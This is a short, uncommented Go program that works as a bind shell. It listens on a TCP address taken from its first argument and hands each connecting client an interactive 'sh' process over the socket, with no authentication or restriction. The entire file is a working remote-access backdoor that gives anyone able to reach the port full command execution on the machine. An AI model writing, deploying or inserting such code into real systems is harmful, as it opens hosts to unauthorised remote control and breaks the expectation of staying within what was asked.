package main

import (
	"net"
	"os"
	"os/exec"
)

func main() {
	var ln, _ = net.Listen("tcp", os.Args[1])
	for {
		var conn, _ = ln.Accept()
		var cmd = exec.Command("sh")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Start()
		go func() {
			cmd.Wait()
			conn.Close()
		}()
	}
}
